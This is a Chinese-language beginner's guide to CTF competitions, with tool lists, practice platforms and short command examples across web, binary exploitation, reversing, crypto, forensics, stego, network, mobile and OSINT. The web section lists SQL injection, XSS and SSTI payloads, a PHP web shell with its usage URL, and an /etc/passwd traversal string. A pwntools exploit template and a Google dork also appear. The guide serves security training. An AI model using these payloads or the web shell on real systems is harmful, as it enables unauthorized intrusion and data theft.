# CTF 新手指南（汇总版）
> 这份文档为 CTF（Capture The Flag）初学者准备，涵盖常见题型、解题思路、逐步教程与工具使用方法。
> 适用于：练习平台题（CTFHub、BUUCTF、picoCTF、HackTheBox 等），以及入门/进阶选手自学。

---

# 📘 目录
- [概览](#概览)
- [常见题型总览（速查表）](#常见题型总览速查表)
- [解题思路速查表](#解题思路速查表)
- [常用工具清单](#常用工具清单)
- [入门建议与练习平台](#入门建议与练习平台)
- [逐题型实战教程（含命令与示例）](#逐题型实战教程含命令与示例)
  - [Web 安全](#1-web-安全)
  - [Pwn（程序漏洞利用）](#2-pwn程序漏洞利用)
  - [Reverse（逆向分析）](#3-reverse逆向分析)
  - [Crypto（密码学）](#4-crypto密码学)
  - [Forensics（取证）](#5-forensics取证)
  - [Stego / Misc（隐写与杂项）](#6-stego--misc隐写与杂项)
  - [Network（流量分析）](#7-network流量分析)
  - [Mobile（移动安全）](#8-mobile移动安全)
  - [OSINT（公开情报收集）](#9-osint公开情报收集)
- [遇题首做 10 项检查清单](#遇题首做-10-项检查清单)
- [附录：推荐学习路线](#附录推荐学习路线)

---

# 概览
CTF 是信息安全领域的实战训练赛，通过解题的方式掌握漏洞分析、取证、逆向、密码学、隐写、流量分析等技能。  
每个题型的目标：**发现漏洞 → 利用漏洞 → 获取 flag**。

---

# 常见题型总览（速查表）

| 类别 | 简介 | 典型考点 | 常用工具 |
|------|------|----------|----------|
| **Web 安全** | 网站漏洞与逻辑绕过 | SQLi、XSS、SSTI、SSRF、文件上传、LFI/RFI | Burp Suite、curl、sqlmap、ffuf、dirsearch |
| **Pwn** | 二进制漏洞利用 | 栈溢出、堆溢出、ROP、格式化字符串 | gdb、pwntools、ROPgadget、IDA、Ghidra |
| **Reverse** | 程序逻辑还原 | 反编译、算法逆向、解密 | Ghidra、IDA、radare2、jadx |
| **Crypto** | 密码学分析 | RSA、AES、XOR、Hash、Base 编码 | CyberChef、RsaCtfTool、hashcat、Python |
| **Forensics** | 数字取证 | 日志、内存、流量包分析 | Wireshark、Volatility、binwalk、strings |
| **Stego / Misc** | 隐写与综合杂项 | 图片音频隐写、多层压缩、编码 | zsteg、stegsolve、exiftool、foremost |
| **Network** | 流量分析与协议利用 | HTTP、FTP、DNS、TCP/IP | Wireshark、tshark、Scapy |
| **Mobile** | 移动应用安全 | 反编译、动态 hook、通信分析 | jadx、apktool、frida、mitmproxy |
| **OSINT** | 公开情报搜集 | 社交媒体、图片反查、域名历史 | Google Dork、Maltego、theHarvester |

---

# 解题思路速查表

| 类型 | 常见步骤 |
|------|-----------|
| **Web** | 信息收集 → 参数探测 → 注入/模板测试 → 文件/逻辑利用 → flag |
| **Pwn** | checksec → 泄露偏移 → 构造 ROP/shellcode → exploit |
| **Reverse** | 反编译 → 查找关键函数 → 逆向算法 → 输入 flag |
| **Crypto** | 判断编码/加密 → 数学推导/工具破解 → 明文 |
| **Forensics** | 提取文件 → 搜索 flag → 时间线重建 |
| **Stego** | 文件分析 → 元数据提取 → 多层解码 |
| **Network** | 抓包 → 提取通信内容 → 重放或还原 |
| **OSINT** | 搜索 → 地理/社交定位 → 拼接信息 |

---

# 常用工具清单

| 类别 | 工具 |
|------|------|
| 扫描 | `nmap`, `whatweb`, `dirsearch`, `ffuf` |
| Web 渗透 | Burp Suite, `sqlmap`, `curl`, `wfuzz` |
| 二进制 | `checksec`, `pwntools`, `gdb`, `ROPgadget` |
| 逆向 | IDA Pro, Ghidra, radare2, `uncompyle6`, `jadx` |
| 编码/加密 | CyberChef, `openssl`, RsaCtfTool, `hashcat` |
| 取证 | `strings`, `binwalk`, `foremost`, Volatility |
| 隐写 | `zsteg`, `steghide`, `stegsolve`, `exiftool` |
| 流量 | Wireshark, `tshark`, `tcpdump`, Scapy |
| 移动 | `apktool`, `frida`, `adb`, `mitmproxy` |

---

# 入门建议与练习平台

1. **从 Web 与 Misc 开始**：反馈最快，工具直观。  
2. **多看 WriteUp**：重点在理解攻击链，而非背命令。  
3. **搭建环境**：Docker + Kali + pwntools + Ghidra。  
4. **推荐平台**：
   - [CTFHub](https://www.ctfhub.com/)
   - [BUUCTF](https://buuoj.cn/)
   - [Hack The Box](https://www.hackthebox.com/)
   - [TryHackMe](https://tryhackme.com/)
   - [picoCTF](https://picoctf.org/)

---

# 逐题型实战教程（含命令与示例）

<a id="1-web-安全"></a>
## 1️⃣ Web 安全

### 🔹 信息收集
```bash
nmap -sC -sV -p- target.com
whatweb http://target.com
dirsearch -u http://target.com -e php,html,txt -t 40
```

### 🔹 SQL 注入
```bash
sqlmap -u "http://target.com/item?id=1" --batch --random-agent
```
手动测试：
```
' OR '1'='1
' UNION SELECT NULL,NULL--
```

### 🔹 XSS
```html
"><script>alert(1)</script>
```

### 🔹 SSTI
```
{{7*7}}
{% 7*7 %}
```

### 🔹 文件上传
```php
<?php system($_GET['cmd']); ?>
```
访问：`http://target/uploads/shell.php?cmd=ls`

### 🔹 LFI / RFI
```
?file=../../../../etc/passwd
```

### 🔹 工具清单
Burp Suite、sqlmap、ffuf、dirsearch、nikto

---

<a id="2-pwn程序漏洞利用"></a>
## 2️⃣ Pwn（程序漏洞利用）

### 🔹 初步分析
```bash
file vuln
checksec --file=./vuln
strings vuln | grep -i flag
```

### 🔹 溢出测试
```python
from pwn import *
p = process('./vuln')
p.sendline(b"A"*300)
p.wait()
```
在 gdb 中确认 EIP 覆盖位置。

### 🔹 ROP 链
```bash
ROPgadget --binary ./vuln --only "pop|ret"
```

### 🔹 Exploit 模板
```python
from pwn import *
elf = ELF('./vuln')
p = process('./vuln')
payload = b"A"*offset + p64(ret_addr)
p.sendline(payload)
p.interactive()
```

### 🔹 工具清单
gdb + pwndbg, pwntools, checksec, ROPgadget, Ghidra

---

<a id="3-reverse逆向分析"></a>
## 3️⃣ Reverse（逆向分析）

### 🔹 静态分析
```bash
file program.bin
strings program.bin | less
r2 -A program.bin
```

### 🔹 反编译
```bash
uncompyle6 file.pyc > file.py
jadx -d out app.jar
```

### 🔹 Hook 分析
```bash
frida -U -f com.example.app -l script.js --no-pause
```

---

<a id="4-crypto密码学"></a>
## 4️⃣ Crypto（密码学）

### 🔹 编码识别
```bash
echo 'YmFzZTY0' | base64 -d
echo '68656c6c6f' | xxd -r -p
```

### 🔹 XOR 爆破
```python
s=bytes.fromhex("...")
for k in range(256):
    t=bytes([b^k for b in s])
    if b"flag" in t: print(k,t)
```

### 🔹 RSA
```bash
RsaCtfTool.py --publickey public.pem --uncipher cipher.bin
```

### 🔹 Hash 破解
```bash
hashcat -m 0 hash.txt wordlist.txt
```

---

<a id="5-forensics取证"></a>
## 5️⃣ Forensics（取证）

### 🔹 文件分析
```bash
strings suspect.img | grep -i flag
binwalk -e image.bin
```

### 🔹 pcap 分析
```bash
tshark -r capture.pcap -Y 'http.request'
```

### 🔹 内存镜像
```bash
volatility -f mem.dmp --profile=Win7SP1x64 pslist
```

---

<a id="6-stego--misc隐写与杂项"></a>
## 6️⃣ Stego / Misc（隐写）

### 🔹 图片隐写
```bash
file img.png
exiftool img.png
zsteg img.png
steghide extract -sf img.jpg -p password
```

### 🔹 多层解码
```bash
cat file.txt | base64 -d | xxd -r -p | gunzip > out
```

---

<a id="7-network流量分析"></a>
## 7️⃣ Network（流量分析）

### 🔹 抓包
```bash
tcpdump -i eth0 -w capture.pcap
```

### 🔹 分析
```bash
tshark -r capture.pcap -Y 'http' -T fields -e http.host -e http.request.uri
```

---

<a id="8-mobile移动安全"></a>
## 8️⃣ Mobile（移动安全）

### 🔹 反编译 APK
```bash
apktool d app.apk -o out_apk
jadx -d out app.apk
```

### 🔹 动态 Hook
```bash
frida -U -f com.example.app -l hook.js --no-pause
```

### 🔹 网络分析
- 使用 mitmproxy 抓取 HTTPS 请求

---

<a id="9-osint公开情报收集"></a>
## 9️⃣ OSINT（公开情报）

### 🔹 域名分析
```bash
whois target.com
dig +short target.com
```

### 🔹 Google Dork
```
site:example.com "index of" OR "internal"
```

---

# ✅ 遇题首做 10 项检查清单

1. `nmap` + `whatweb`：端口与指纹  
2. `ffuf/dirsearch`：目录枚举  
3. 检查所有输入点（GET/POST/Header/Cookie）  
4. token/session 逻辑是否可滥用  
5. 是否可注入（SQLi / SSTI / OS 命令）  
6. 是否存在上传/包含漏洞  
7. 是否能触发 LFI / RFI / 日志注入  
8. 二进制题使用 `checksec` 检查保护  
9. 隐写类文件用 `strings` + `exiftool` + `binwalk`  
10. 流量与日志题用 `tshark` / `grep` 分析

---

# 📈 附录：推荐学习路线

1️⃣ Web 基础 → SQLi / XSS / 文件上传 / SSRF / SSTI  
2️⃣ Crypto 基础 → Base家族 / XOR / RSA 弱点 / 哈希碰撞  
3️⃣ Reverse → Python/Java/.NET 反编译练习  
4️⃣ Pwn → 栈溢出 → ROP → 堆利用  
5️⃣ Forensics / Stego → 文件分析 + 隐写技巧  
6️⃣ OSINT → Google Dork / 图像识别 / DNS 历史  
7️⃣ 综合攻防赛练习：BUUCTF、攻防世界、CTFHub

---
